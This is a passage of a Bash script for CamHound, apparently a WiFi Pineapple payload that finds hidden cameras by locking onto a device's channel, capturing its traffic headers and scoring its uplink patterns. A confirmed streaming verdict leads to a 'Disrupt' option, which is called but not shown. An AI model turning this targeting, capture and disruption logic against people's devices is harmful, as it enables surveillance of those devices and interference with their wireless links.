bands_apply() {   # write the device's bands + 6 for this run; BANDS_ORIG remembers what to restore
  # Verified by the live channel, not by uci: on the bare 1.1.3 unit (day-one 8c, 2026-11-03) the call left uci
  # at 2,5 AND the hop set on 2.4/5 GHz with pineapd running, so uci alone cannot tell "applied at runtime"
  # from "no-op", and the hop set is the thing an operator switching BAND6 on actually wants.
  local cur want got live=no pid0 pid1
  [ -n "$BANDS_ORIG" ] && return 0                                  # already applied this run
  cur=$(bands_read); want=$(bands_plan "$cur")
  [ -n "$want" ] || { log bands "no write: bands ${cur:-unreadable}"; return 0; }
  command -v PINEAPPLE_SET_BANDS >/dev/null 2>&1 || { log warn "bands: PINEAPPLE_SET_BANDS not present"; ui_ok && LOG yellow "band write: command not present"; return 1; }
  pid0=$(pidof pineapd 2>/dev/null)
  # The undo record comes first and is a precondition: a write that could not be undone after a kill is not issued.
  if ! { mkdir -p "${BANDS_STATE%/*}" && printf '%s %s\n' "$cur" "$MAIN_PID" >"$BANDS_STATE" && [ -s "$BANDS_STATE" ]; } 2>/dev/null; then
    log warn "bands: write skipped, cannot record the undo in $BANDS_STATE"; ui_ok && LOG yellow "band write skipped: cannot record the undo ($BANDS_STATE)"; return 1
  fi
  BANDS_WROTE="$cur"
  # shellcheck disable=SC2086   # the tokens are the argument list
  PINEAPPLE_SET_BANDS "$RECON_IF" $want >/dev/null 2>&1; sleep 1
  bands_live6 && live=yes; got=$(bands_read); pid1=$(pidof pineapd 2>/dev/null)
  if [ "$pid0" != "$pid1" ]; then log warn "bands: pineapd restarted by the band write ($pid0 -> $pid1): Recon reset"; ui_ok && LOG yellow "band write restarted pineapd: Recon starts over"; fi
  if [ "$live" = yes ] || [[ ,$got, == *,6,* ]]; then
    BANDS_ORIG="$cur"; BANDS_LINE="${cur:+$cur,}6"; [[ ,$got, == *,6,* ]] && BANDS_LINE="$got"
    log bands "set $want (was $cur; live 6 GHz=$live, uci=$got)"; ui_ok && LOG "bands: $BANDS_LINE (2.4 GHz dwell ~1/3 of normal)"
  else
    log warn "bands: write not applied (no 6 GHz channel seen in ${BANDS_PROBE_N} samples, uci still '${got:-?}') after SET_BANDS $want"
    ui_ok && LOG yellow "band write not applied: radio stayed on ${got:-?}"
  fi
  return 0
}
bands_restore() {   # put the device's bands back after any write this run issued, trusted or not; a no-op otherwise
  local orig="${BANDS_ORIG:-$BANDS_WROTE}" note=""
  [ -n "$orig" ] || return 0
  [ -n "$BANDS_ORIG" ] || note=" (write was never trusted; restoring anyway)"
  # shellcheck disable=SC2086
  PINEAPPLE_SET_BANDS "$RECON_IF" ${orig//,/ } >/dev/null 2>&1
  log bands "restored $orig$note"; BANDS_ORIG=""; BANDS_WROTE=""; rm -f "$BANDS_STATE"
  BANDS_LINE=$(bands_read); [ -n "$BANDS_LINE" ] && [[ $BANDS_LINE != *6* ]] && BANDS_LINE+=" (6 GHz not scanned)"
  return 0
}
bands_recover() {   # at start: a record means a previous run wrote the bands and never put them back (killed mid-run)
  local b pid claim="$BANDS_STATE.recover.$$"
  [ -s "$BANDS_STATE" ] || return 0
  mv -f "$BANDS_STATE" "$claim" 2>/dev/null || return 0               # that run's own watchdog got there first
  read -r b pid <"$claim" 2>/dev/null; rm -f "$claim"
  [[ $b =~ ^[256](,[256])*$ ]] || { log warn "bands: dropped an unreadable record (${b:-empty})"; return 0; }
  command -v PINEAPPLE_SET_BANDS >/dev/null 2>&1 || return 0
  # shellcheck disable=SC2086
  PINEAPPLE_SET_BANDS "$RECON_IF" ${b//,/ } >/dev/null 2>&1
  log bands "restored $b left by a previous run${pid:+ (pid $pid)}"; ui_ok && LOG yellow "bands: restored $b left by a previous run"
  BANDS_LINE=$(bands_read); [ -n "$BANDS_LINE" ] && [[ $BANDS_LINE != *6* ]] && BANDS_LINE+=" (6 GHz not scanned)"
  return 0
}

# scan_loop: cycles until B opens Review and the operator picks Exit
scan_loop() {
  local rc btn
  set_state SCAN
  LOG "[$MODE] scanning"
  while :; do
    run_cycle; emit_cycle
    if (( RECON_EMPTY >= 3 )); then
      RECON_EMPTY=0
      # PINEAPPLE_RECON_NEW's one parameter is a session NAME in the 2.0.0 firmware's own help (no duration exists
      # there; day-one 8b checks it on the bench), so it is called bare: correct under either reading, and an
      # unbounded session is what a continuous scan wants anyway. An earlier version passed 60 and logged "(60 s)".
      if confirm "Recon list empty. Start a Recon session?"; then PINEAPPLE_RECON_NEW >/dev/null 2>&1; log recon "RECON_NEW requested"; LOG "Recon session requested"; fi
    fi
    offer_dialogs
    set_state SCAN
    # The wait below is the ONLY window in which B reaches this payload; outside it the firmware
    # owns the button and answers with "stop the payload?". The banner used to promise "B =
    # review/pause" for the whole run, which was false whenever a cycle overran CYCLE_SECS - and
    # while the OUI scan took minutes per cycle the window was under a tenth of the time, so B
    # looked broken. Announce the window instead of claiming the button.
    LOG green "press B now to review (${CYCLE_SECS}s)"
    # Read stdout, not just rc. WAIT_FOR_BUTTON_PRESS prints the button name and exits 0 on a
    # press - but it ALSO exits 0 on `ERROR: unknown button` and on its usage dump (both measured
    # on the device). So rc alone cannot tell a press from a bad argument, and a mistyped button
    # name would read as a press on every iteration and spin review_list open.
    btn=$(timeout "$CYCLE_SECS" WAIT_FOR_BUTTON_PRESS B 2>/dev/null); rc=$?
    if (( rc == 0 )) && [ "$btn" = B ]; then
      local t0=$EPOCHSECONDS
      review_list || return 1
      PAUSED_SECS=$((PAUSED_SECS + EPOCHSECONDS - t0))
      set_state SCAN
    elif (( rc == 0 )); then
      log warn "button: rc 0 but stdout was [${btn:0:40}], not B"; sleep 1
    elif (( rc != 124 )); then sleep 1; fi
  done
}

main_menu() {
  local def="Scan"
  while :; do
    local -a menu=("Scan"); (( DEDUPE_H > 0 )) && menu+=("Scan (fresh)"); menu+=("Review hits"); [ "$SHOW_MODULES" = 1 ] && menu+=("Unidentified modules"); [ "$SHOW_OTHER" = 1 ] && menu+=("Other devices"); menu+=("Mode" "Settings" "Write report" "Exit")
    pick_list "CamHound $VERSION [$MODE] sigs:$SIG_COUNT" "$def" "${menu[@]}" || { def="Exit"; continue; }
    case "$PICK" in
      "Scan") scan_loop || def="Exit" ;;
      "Scan (fresh)") DEDUPE_RUN=0; LOG "fresh scan: earlier runs ignored"; log mode "dedupe off for this run"; scan_loop || def="Exit" ;;
      "Review hits") review_list || def="Exit" ;;
      "Unidentified modules") modules_list ;;
      "Other devices") other_list ;;
      "Mode") mode_menu ;;
      "Settings") settings_menu ;;
      "Write report") write_report; LOG "report: $LOOT_DIR/report_$RUN_ID.txt" ;;
      "Exit") if confirm "Exit CamHound?"; then return 0; fi; def="Scan" ;;
    esac
  done
}

# --- watch core begin ---
# pcap parser: hexdump words -> per-second buckets "ts bytes frames big" (all four magics; -s 32 records)
PCAP_AWK='
function swap(w) { return (w % 256) * 16777216 + (int(w / 256) % 256) * 65536 + (int(w / 65536) % 256) * 256 + int(w / 16777216) }
function rd(w) { return sw ? swap(w) : w }
NR == 1 { m = $1
  if (m == 2712847316 || m == 2712812077) sw = 0
  else if (m == 3569595041 || m == 1295823521) sw = 1
  else { print "parse error magic " m; bad = 1; exit 1 }
  next }
NR <= 6 { next }
skip > 0 { skip--; next }
{ hdr[++h] = rd($1)
  if (h == 4) { ts = hdr[1]; il = hdr[3]; ol = hdr[4]; h = 0
    if (il % 4 != 0) { print "parse error incl_len " il; bad = 1; exit 1 }
    skip = il / 4; B[ts] += ol; F[ts]++; if (ol >= big) G[ts]++
    if (!(ts in seen)) { seen[ts] = 1; order[++n] = ts } } }
END { if (bad) exit 1; for (i = 1; i <= n; i++) { t = order[i]; print t, B[t] + 0, F[t] + 0, G[t] + 0 } }'
pcap_words() { if command -v hexdump >/dev/null 2>&1; then hexdump -v -e '1/4 "%u\n"' "$1" 2>/dev/null; else od -An -v -tu4 -w4 "$1" 2>/dev/null | tr -d ' '; fi; }
pcap_buckets() { pcap_words "$1" | awk -v big="$BIG_BYTES" "$PCAP_AWK"; }

# bucket_stats file -> "secs frames bytes big maxbig cv10" over the bucket lines (cv on per-second big counts)
bucket_stats() {
  awk 'function isqrt(x, r, y) { if (x <= 0) return 0; r = x; y = int((r + 1) / 2); while (y < r) { r = y; y = int((r + x / r) / 2) } return r }
       NF == 4 { n++; f += $3; b += $2; g += $4; v[n] = $4; if ($4 > mx) mx = $4 }
       END { cv = -1
         if (n >= 8) { for (i = 2; i < n; i++) { s += v[i]; k++ } m = s / k; for (i = 2; i < n; i++) ss += (v[i] - m) * (v[i] - m)
           if (m > 0) cv = int(isqrt(int(ss / (k - 1) * 100)) / m + 0.5) }
         # %.0f, not %d: BusyBox awk casts through (int) for d/i/o/u/x/X (editors/awk.c:2418), so a
         # byte accumulator past 2^31 is corrupted - wrapped on x86, saturated on a soft-float
         # mipsel target. Bare print and %.0f take the long path and are exact.
         # (No apostrophes in here: this is a single-quoted awk program and one would close it.)
         printf "%.0f %.0f %.0f %.0f %.0f %.0f\n", n, f, b, g, mx, cv }' "$1"
}

WATCH_MAC=""; WATCH_BSSID=""; WATCH_CH=0; WATCH_ROLE=""; CAP_PIDS=""; CUR=A
declare -a RUNS

# lock_target bssid secs [channel] -> 0 locked, 1 locked by channel, 2 lock failed
LOCK_TEXT=""
lock_target() {   # lock_target <bssid> <secs> [channel]; the channel defaults to the current Watch target's
  local bssid="$1" secs="$2" c1 c2 c3 c4 raw ngood want="${3:-${WATCH_CH:-0}}"
  PINEAPPLE_EXAMINE_BSSID "$bssid" "$secs" >/dev/null 2>&1; WATCH_LOCKED=1; LAST_LOCK_TS=$EPOCHSECONDS
  sleep 0.5; c1=$(cur_channel); sleep 0.5; c2=$(cur_channel); sleep 0.5; c3=$(cur_channel)
  raw="${c1:-_}/${c2:-_}/${c3:-_}"      # kept BEFORE the backfill: this is what the operator gets told
  LOCK_TEXT="$RECON_IF ch ${c3:-?}, target ch $want"
  # rc 3, not 0: we could not read the channel back, so we do not know whether the lock took.
  # Returning 0 here recorded lock=ok for a lock that was never verified, and LOCK_TEXT never
  # reached the operator. Proceeding is still right -- the alternative is refusing every response
  # on a device whose channel cannot be read -- but it must be labelled honestly in the loot.
  [ -z "$c3" ] && { LOCK_TEXT="$RECON_IF: no channel read-back ($raw), lock unverified"; return 3; }
  # A transient unreadable sample is not evidence of hopping. Measured on the bench 2026-11-09:
  # c1 came back EMPTY while c2 and c3 both read 1 and the target channel WAS 1 -- the radio was
  # parked exactly where it was asked to be -- yet the all-three-equal test below scored that
  # "still hopping (/1/1)", returned 2, and refused the whole response (loot row LOCK_FAILED on
  # 50:92:6a:ae:a8:82). cur_channel returns empty on a read it cannot parse, which is a missing
  # sample, not a different channel; compare only the samples we actually got.
  # Backfill from the LAST sample outward. c3 is known non-empty -- the rc 3 guard above returned if
  # it was not -- so repairing c2 from c3, then c1 from the REPAIRED c2, collapses any run of
  # unreadable samples onto the one reading we actually have. The other order copied c2 into c1
  # before c2 itself was repaired, so with c1 AND c2 both unreadable c1 stayed empty and the
  # all-three-equal test below scored "still hopping (/1/1)" -- character for character the bench
  # symptom this repair was added to stop. The measured case (ONE empty sample) passed either way,
  # which is why neither the harness nor the selftest caught it; the audit did. The selftest cases
  # are inline below (search 'lock_target:'), not in a helper -- an earlier version of this line
  # said "st_lock covers both" and no such function has ever existed.
  ngood=0
  [ -n "$c1" ] && ngood=$(( ngood + 1 ))
  [ -n "$c2" ] && ngood=$(( ngood + 1 ))
  [ -n "$c3" ] && ngood=$(( ngood + 1 ))
  [ -z "$c2" ] && c2="$c3"
  [ -z "$c1" ] && c1="$c2"
  if [ "$c1" = "$c2" ] && [ "$c2" = "$c3" ]; then
    # ⚠ ONE readable sample cannot establish that the radio is parked, and the backfill above makes
    # the comparison PASS on one: with c1 AND c2 unreadable the test becomes c3 = c3 = c3, a
    # tautology carrying no stability information at all. Until 2026-11-10 that returned 0 and wrote
    # lock=ok -- MORE confidence from LESS evidence than the two-readable-samples case beside it,
    # which returns 3 -- inverting the contract this function states ten lines above. One sample now
    # reports the unverified state that already exists. rc 3 still PROCEEDS, so the 2026-11-09 fix
    # (never refuse a parked radio over a transient empty read) is intact; only the label changes,
    # and the loot stops asserting a verification that did not happen.
    if (( ngood < 2 )); then
      LOCK_TEXT="$RECON_IF ch $c3 from ONE readable sample ($raw): lock unverified"
      return 3
    fi
    [ "$c3" = "$want" ] || [ "$want" = 0 ] && return 0
    # The FOURTH read, which both the 2026-11-09 and 2026-11-10 repairs stopped short of: they
    # protected c1-c3 and left this one bare, so one transient empty here still scored
    # "ch  != 1, lock failed" -- rc 2, which refuses the whole response and transmits nothing. Same
    # function, same cur_channel, same failure mode, and at the re-arm call site the membership
    # capture and its dwell have already been spent by the time it fires.
    PINEAPPLE_EXAMINE_CHANNEL "$want" "$secs" >/dev/null 2>&1; sleep 1; c4=$(cur_channel)
    if [ -z "$c4" ]; then
      LOCK_TEXT="$RECON_IF: no read-back after EXAMINE_CHANNEL $want, lock unverified"
      return 3
    fi
    LOCK_TEXT="locked by channel: $RECON_IF ch $c4"
    [ "$c4" = "$want" ] && return 1
    LOCK_TEXT="ch $c4 != $want, lock failed"; return 2
  fi
  # The RAW triple, not the backfilled one. The 2026-11-09 defect was diagnosable only because the
  # log read "still hopping (/1/1)" and the empty slot was visible; printing the repaired values
  # made that signature unreachable by construction and reported sample values that were never
  # read. The backfill is the right input to the comparison and the wrong output to the operator.
  LOCK_TEXT="$RECON_IF still hopping (samples $raw): lock failed"; return 2
}
# cur_channel: iwinfo first, then iw. iwinfo is a declared dependency but is NOT in the measured
# device inventory (CLAUDE.md "First contact" lists tcpdump/iw/hak5cmd/scp present and does not
# mention iwinfo); iw IS measured present. Without a fallback, an absent iwinfo or a non-numeric
# read-back ("Channel: unknown" on a monitor interface) makes lock_target fail OPEN and report an
# unverified lock as lock=ok -- the false-green guard this rung is built around, inert while
# reporting healthy. The iw form is the one bands_live6 already uses.
cur_channel() {
  local c
  c=$(iwinfo "$RECON_IF" info 2>/dev/null | sed -n 's/.*Channel: \([0-9]*\).*/\1/p' | head -1)
  [ -n "$c" ] && { printf '%s' "$c"; return 0; }
  iw dev "$RECON_IF" info 2>/dev/null | sed -n 's/.*channel \([0-9]*\) .*/\1/p' | head -1
}
unlock_target() { _pineap EXAMINE CANCEL >/dev/null 2>&1; PINEAPPLE_EXAMINE_RESET >/dev/null 2>&1; WATCH_LOCKED=0; LAST_LOCK_TS=$EPOCHSECONDS; }

# captures: start_caps X -> three header-only pcaps (/tmp/cs_up_X.pcap ...); stop_caps X -> TERM + wait by PID
start_caps() {
  local x="$1" p
  rm -f "/tmp/cs_up_$x.pcap" "/tmp/cs_dn_$x.pcap" "/tmp/cs_ot_$x.pcap"
  tcpdump -i "$RECON_IF" -nn -s 32 -w "/tmp/cs_up_$x.pcap" "type data and wlan addr2 $WATCH_MAC" 2>"/tmp/cs_up_$x.err" & p=$!; CAP_PIDS="$p"; child_add "$p"
  tcpdump -i "$RECON_IF" -nn -s 32 -w "/tmp/cs_dn_$x.pcap" "type data and wlan addr1 $WATCH_MAC" 2>"/tmp/cs_dn_$x.err" & p=$!; CAP_PIDS+=" $p"; child_add "$p"
  if [ "$WATCH_OTHERS" = 1 ] && [ "$WATCH_ROLE" = cli ]; then
    tcpdump -i "$RECON_IF" -nn -s 32 -w "/tmp/cs_ot_$x.pcap" "type data and wlan addr1 $WATCH_BSSID and not wlan addr2 $WATCH_MAC" 2>"/tmp/cs_ot_$x.err" & p=$!; CAP_PIDS+=" $p"; child_add "$p"
  fi
  eval "CAPS_$x=\"\$CAP_PIDS\""
  local t="${EPOCHREALTIME:-$EPOCHSECONDS.000}"; eval "CAPT0_$x=\"${t/./}\""
}
stop_caps() {
  local x="$1" p pids t0 t1
  eval "pids=\$CAPS_$x"; eval "t0=\$CAPT0_$x"
  t1="${EPOCHREALTIME:-$EPOCHSECONDS.000}"; t1=${t1/./}
  CAP_MS=$(( (${t1:0:-3} - ${t0:0:-3}) ))      # microseconds -> milliseconds
  (( CAP_MS < 1000 )) && CAP_MS=1000
  for p in $pids; do kill -TERM "$p" 2>/dev/null; done
  for p in $pids; do wait "$p" 2>/dev/null; child_del "$p"; done
}
CAP_MS=1000
drops_of() { local n; n=$(sed -n 's/^\([0-9]*\) packets* dropped by kernel.*/\1/p' "$1" 2>/dev/null | tail -1); printf '%s' "${n:-0}"; }

# window_metrics X -> WM_* for the window (fixed point x10 where noted)
window_metrics() {
  local x="$1" s
  WM_ERR=""
  if ! pcap_buckets "/tmp/cs_up_$x.pcap" >"/tmp/cs_up_$x.b" 2>/dev/null; then WM_ERR="parse error"; fi
  pcap_buckets "/tmp/cs_dn_$x.pcap" >"/tmp/cs_dn_$x.b" 2>/dev/null || WM_ERR="parse error"
  read -r WM_USEC WM_UF WM_UB WM_UG _ WM_UCV <<<"$(bucket_stats "/tmp/cs_up_$x.b")"
  read -r _ WM_DF WM_DB WM_DG _ _ <<<"$(bucket_stats "/tmp/cs_dn_$x.b")"
  WM_OF=0; if [ -f "/tmp/cs_ot_$x.pcap" ]; then pcap_buckets "/tmp/cs_ot_$x.pcap" >"/tmp/cs_ot_$x.b" 2>/dev/null; read -r _ WM_OF _ _ _ _ <<<"$(bucket_stats "/tmp/cs_ot_$x.b")"; fi
  WM_DROPS=$(( $(drops_of "/tmp/cs_up_$x.err") + $(drops_of "/tmp/cs_dn_$x.err") ))
  s=$CAP_MS; WM_SECS10=$(( s / 100 ))                                               # measured capture length, tenths of a second
  WM_UPRATE10=$(( WM_UG * 10000 / s )); WM_UPS10=$(( WM_UF * 10000 / s ))        # big uplink fr/s x10, all uplink fr/s x10
  WM_DNRATE10=$(( WM_DG * 10000 / s ))
  if (( WM_UF >= 50 )); then WM_ASYM10=$(( WM_UB * 10 / (WM_DB + 1) )); (( WM_ASYM10 > 9999 )) && WM_ASYM10=9999; else WM_ASYM10=-1; fi
  if [ "$KEEP_RAW" = 1 ] && [ "$(stat -c %s "$LOOT_DIR/raw_$RUN_ID.txt" 2>/dev/null || echo 0)" -lt 2000000 ]; then   # ~60,000 bucket lines
    { printf '# %s up %s\n' "$EPOCHSECONDS" "$WATCH_MAC"; cat "/tmp/cs_up_$x.b"; printf '# dn\n'; cat "/tmp/cs_dn_$x.b"; } >>"$LOOT_DIR/raw_$RUN_ID.txt" 2>/dev/null
  fi
  if [ "$KEEP_PCAP" = 1 ]; then mkdir -p "$LOOT_DIR/watch_$RUN_ID"; cp "/tmp/cs_up_$x.pcap" "$LOOT_DIR/watch_$RUN_ID/up_$EPOCHSECONDS.pcap" 2>/dev/null; fi
  rm -f "/tmp/cs_up_$x.pcap" "/tmp/cs_dn_$x.pcap" "/tmp/cs_ot_$x.pcap"
}

# capture_window SECS [A-key] -> runs one window with double-buffering handled by caller; waits SECS (A stops early -> rc 10)
wait_window() {
  local secs="$1" rc
  if ui_ok; then timeout "$secs" WAIT_FOR_BUTTON_PRESS A >/dev/null 2>&1; rc=$?; (( rc == 0 )) && return 10; (( rc != 124 )) && sleep "$secs"
  else sleep "$secs"; fi
  return 0
}
rate_band() { local r10="$1"; if (( r10 < 5 )); then printf '<0.5'; elif (( r10 < 20 )); then printf '0.5-2'; elif (( r10 < 80 )); then printf '2-8'; else printf '>8'; fi; }
fmt10() { printf '%d.%d' $(( $1 / 10 )) $(( $1 % 10 < 0 ? -($1 % 10) : $1 % 10 )); }

# watch_prepare mac -> sets WATCH_* and verifies the lock; 0 ok, 1 failed (message shown)
watch_prepare() {
  local mac="$1" secs="$2" rc
  WATCH_MAC="$mac"; WATCH_ROLE="${ROLE[$mac]}"; [ "$WATCH_ROLE" = "ap+cli" ] && WATCH_ROLE=ap
  if [ "$WATCH_ROLE" = cli ]; then WATCH_BSSID="${AP_OF[$mac]}"; else WATCH_BSSID="$mac"; fi
  WATCH_CH="${CH[$mac]:-0}"; [ "$WATCH_CH" = 0 ] && WATCH_CH="${CH[$WATCH_BSSID]:-0}"
  [ -n "$WATCH_BSSID" ] && [ "$WATCH_BSSID" != "-" ] || { LOG "no BSSID: cannot lock"; return 1; }
  set_state WATCH
  LOG "[$MODE] Watch ${ID_LABEL[$mac]:-?} ${mac:9}"$'\n'"Recon paused while watching"
  [[ ${RSSI_LAST[$mac]:-0} =~ ^-?[0-9]+$ ]] && (( ${RSSI_LAST[$mac]:-0} < WATCH_MIN_RSSI )) && LOG yellow "weak signal (${RSSI_LAST[$mac]} dBm): idle verdict unreliable, Locate first"
  lock_target "$WATCH_BSSID" "$secs"; rc=$?
  if (( rc == 2 )); then LOG yellow "$LOCK_TEXT"; unlock_target; set_state SCAN; return 1; fi
  (( rc == 1 )) && LOG "$LOCK_TEXT"
  (( rc == 3 )) && LOG yellow "$LOCK_TEXT"      # proceeding, but the lock was never verified
  return 0
}

# verdict_of: from per-window arrays -> V_WORD V_BEH V_GATE V_TEXT V_EVENT
declare -a W_UP W_DN W_AS W_UF W_DF W_UPS W_CV
verdict_live() {
  local n=${#W_UP[@]} i stream=0 asym=0 down=0 up2=0 small=0 big_any=0 cvsum=0 cvn=0 rate_sum=0 cv
  V_WORD=NONE; V_BEH=0; V_GATE=0; V_TEXT=""; V_EVENT=0
  for ((i = 0; i < n; i++)); do
    (( i < 2 )) && up2=$((up2 + W_UF[i]))
    (( W_UP[i] >= THR_STREAM_UP * 10 )) && stream=$((stream + 1))
    (( W_AS[i] >= 0 && W_AS[i] >= THR_ASYM10 )) && asym=$((asym + 1))
    (( W_AS[i] >= 0 && W_AS[i] <= THR_DOWN10 && W_DF[i] > 0 )) && down=$((down + 1))
    (( W_UP[i] >= 20 )) && big_any=1
    (( W_UPS[i] > 0 )) && small=1
    (( W_CV[i] >= 0 )) && { cvsum=$((cvsum + W_CV[i])); cvn=$((cvn + 1)); }
    rate_sum=$((rate_sum + W_UP[i]))
  done
  if (( n >= 2 && up2 == 0 )); then
    V_WORD=INCONCLUSIVE
    if (( W_DF[0] + W_DF[1] == 0 )); then V_TEXT="nothing heard on this channel: lock, band or sleep"; else V_TEXT="AP heard, target silent: asleep, or too far for its data frames; move closer"; fi
    return 0
  fi
  cv=-1; (( cvn > 0 )) && cv=$((cvsum / cvn))
  if (( stream >= 4 && asym >= 2 )) && { (( cv < 0 )) || (( cv <= THR_CV10 )); }; then
    V_WORD=STREAM; V_BEH=$W_STREAM_RATE; (( n > 0 && rate_sum / n >= 250 )) && V_BEH=$W_STREAM_FAST
    (( stream * WIN_SECS >= 20 )) && V_BEH=$((V_BEH + W_SUSTAIN)); V_BEH=$((V_BEH + W_ASYM)); V_GATE=$V_BEH
    V_TEXT="steady big uplink: streaming-consistent"
  elif (( down >= 2 )); then
    V_WORD=DOWN; V_BEH=$W_DOWN; V_TEXT="two-way or download: call, phone, update; not camera-like"
  elif (( asym >= 2 )); then
    V_WORD=NONE; V_BEH=$W_ASYM; V_GATE=$W_ASYM; V_TEXT="up-heavy but below streaming rate"
  elif (( big_any == 0 && small == 1 )); then
    V_WORD=IDLE; [ "$WATCH_ROLE" = ap ] && V_WORD=QUIET; V_TEXT="idle: asleep, disarmed, local-record, or not a camera; low-rate streams can read as idle; identity only"
  else
    V_WORD=NONE; V_TEXT="traffic seen, no camera pattern"
  fi
}
V_WORD=""; V_BEH=0; V_GATE=0; V_TEXT=""; V_EVENT=0

apply_verdict() {   # apply_verdict mac -> BEH monotonic max, verdict latest, rescore
  local mac="$1"
  if [ -z "${BEH[$mac]+x}" ] || (( V_BEH > ${BEH[$mac]} )); then BEH[$mac]=$V_BEH; fi
  (( V_GATE > ${BEH_GATE[$mac]:-0} )) && BEH_GATE[$mac]=$V_GATE
  (( V_EVENT )) && EVENT_FLAG[$mac]=1
  BEH_VERDICT[$mac]="$V_WORD"
  score_device "$mac"
  upsert_rows "$mac"
  log watch "$mac verdict=$V_WORD beh=$V_BEH conf=${CONF[$mac]}"
}

# watch_tsv_row mode run secs up down asym cv delta rec drops verdict
watch_tsv_row() {
  printf '%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s\n' "$EPOCHSECONDS" "$WATCH_MAC" "$WATCH_ROLE" "$WATCH_BSSID" "$WATCH_CH" "${FREQ[$WATCH_MAC]:--}" "$@" "$BATT_W0" "$BATT" "${CHG:--}" >>"$LOOT_DIR/watch_${RUN_ID}_${WATCH_MAC//:/}.tsv"
}
BATT_W0="?"; CHG="-"
watch_tsv_hdr() { local f="$LOOT_DIR/watch_${RUN_ID}_${WATCH_MAC//:/}.tsv"; [ -s "$f" ] || printf '#epoch|mac|role|bssid|ch|freq|mode|run|secs|up|down|asym|cv|delta|rec|drops|verdict|batt_start|batt_end|charging\n' >"$f"; }

# live_view mac -> up to LIVE_WINDOWS double-buffered windows; A stops after the current window
live_view() {
  local mac="$1" i secs rc tot_drops=0 upb dnb
  secs=$(( LIVE_WINDOWS * WIN_SECS + 15 ))
  watch_prepare "$mac" "$secs" || return 1
  BATT_W0="$BATT"; command -v BATTERY_CHARGING >/dev/null 2>&1 && CHG=$(timeout 3 BATTERY_CHARGING 2>/dev/null); watch_tsv_hdr
  W_UP=(); W_DN=(); W_AS=(); W_UF=(); W_DF=(); W_UPS=(); W_CV=(); CUR=A
  start_caps A
  for ((i = 1; i <= LIVE_WINDOWS; i++)); do
    [ "$RELOCK_PER_WINDOW" = 1 ] && (( i > 1 )) && PINEAPPLE_EXAMINE_BSSID "$WATCH_BSSID" $(( WIN_SECS * 2 + 5 )) >/dev/null 2>&1
    wait_window "$WIN_SECS"; rc=$?
    stop_caps "$CUR"
    if (( rc != 10 && i < LIVE_WINDOWS )); then if [ "$CUR" = A ]; then start_caps B; else start_caps A; fi; fi
    window_metrics "$CUR"
    [ -n "$WM_ERR" ] && { LOG yellow "window $i: $WM_ERR"; }
    W_UP+=("$WM_UPRATE10"); W_DN+=("$WM_DNRATE10"); W_AS+=("$WM_ASYM10"); W_UF+=("$WM_UF"); W_DF+=("$WM_DF"); W_UPS+=("$WM_UPS10"); W_CV+=("$WM_UCV")
    tot_drops=$((tot_drops + WM_DROPS))
    upb=$(( WM_UB / 1000 )); dnb=$(( WM_DB / 1000 ))
    LOG "w$i $(fmt10 "$WM_SECS10")s U ${upb}k D ${dnb}k as $( (( WM_ASYM10 >= 0 )) && fmt10 "$WM_ASYM10" || printf -- -)"$'\n'"big $(fmt10 "$WM_UPRATE10")/s oth $WM_OF$( (( WM_DROPS > 0 )) && printf ' rate capped')"
    (( rc == 10 )) && break
    [ "$CUR" = A ] && CUR=B || CUR=A
  done
  unlock_target
  verdict_live
  local cvtxt="-"; (( ${W_CV[0]:--1} >= 0 )) && cvtxt=$(fmt10 "${W_CV[0]}")
  local upsum=0 dnsum=0 assum=0 asn=0 n=${#W_UP[@]} j
  for ((j = 0; j < n; j++)); do upsum=$((upsum + W_UP[j])); dnsum=$((dnsum + W_DN[j])); (( W_AS[j] >= 0 )) && { assum=$((assum + W_AS[j])); asn=$((asn + 1)); }; done
  (( n > 0 )) && { upsum=$((upsum / n)); dnsum=$((dnsum / n)); }; (( asn > 0 )) && assum=$((assum / asn)) || assum=-1
  watch_tsv_row live 1 $((n * WIN_SECS)) "$(fmt10 "$upsum")" "$(fmt10 "$dnsum")" "$( (( assum >= 0 )) && fmt10 "$assum" || printf -- -)" "$cvtxt" - - "$tot_drops" "$V_WORD"
  if [ "$V_WORD" = INCONCLUSIVE ]; then
    set_state INCONCLUSIVE
    LOG yellow "INCONCLUSIVE (<$INCONCLUSIVE_FRAMES frames)"$'\n'"$V_TEXT"$'\n'"$LOCK_TEXT"$'\n'"recon rssi ${RSSI_LAST[$mac]:--} $( [[ ${RSSI_LAST[$mac]:-0} =~ ^-?[0-9]+$ ]] && (( ${RSSI_LAST[$mac]:-0} < -72 )) && printf '(likely too far)')"$'\n'"last seen $(( EPOCHSECONDS - ${LAST_SEEN[$mac]:-$EPOCHSECONDS} ))s ago"
    BEH_VERDICT[$mac]="INCONCLUSIVE"; log watch "$mac INCONCLUSIVE $LOCK_TEXT"
  else
    apply_verdict "$mac"
    summary_card "$mac" live "$upsum" "$dnsum" "$assum" "$cvtxt"
  fi
  BASELINE_NEXT=1; PREV_PKT=(); PREV_T=()
  return 0
}

# summary_card mac mode up10 dn10 asym10 cv -> coloured verdict + metric block + next-action picker
summary_card() {
  local mac="$1" mode="$2" up10="$3" dn10="$4" as10="$5" cv="$6" weak="" col
  [[ ${RSSI_LAST[$mac]:-0} =~ ^-?[0-9]+$ ]] && (( ${RSSI_LAST[$mac]:-0} < WATCH_MIN_RSSI )) && [ "$V_WORD" != STREAM ] && [ "$V_WORD" != EVENT ] && weak=" (weak)"
  case "$V_WORD" in STREAM|EVENT) col=red; set_state WATCH_HIT ;; EVENT?) col=yellow; set_state LANE ;; DOWN) col=cyan; set_state SCAN ;; *) col=""; set_state SCAN ;; esac
  LOG $col "$V_WORD$weak $( [ "$mode" = stim ] && printf 'best of %s' "${RUNS_N[$mac]}" ) -> ${CONF[$mac]} ${BANDNAME[$mac]}"
  LOG "up $(fmt10 "$up10")/s dn $(fmt10 "$dn10")/s as $( (( as10 >= 0 )) && fmt10 "$as10" || printf -- -) cv $cv"$'\n'"~$(rate_band "$up10") Mbps band"$'\n'"${V_TEXT}"
  # A STREAM/EVENT verdict is the strongest evidence CamHound can produce that this is a live
  # camera, so it is where the response funnel belongs: detect -> Watch -> confirmed -> Disrupt.
  if [ "$V_WORD" = STREAM ] || [ "$V_WORD" = EVENT ]; then
    if auto_respond_ok "$mac" && confirm "Streaming confirmed. Disrupt ${ID_LABEL[$mac]:-${mac:9}}?"; then
      disrupt_menu "$mac"; return 0
    fi
  fi
  if [ "$V_WORD" = STREAM ] || [ "$V_WORD" = EVENT ] || (( ${CONF[$mac]} >= 45 )); then
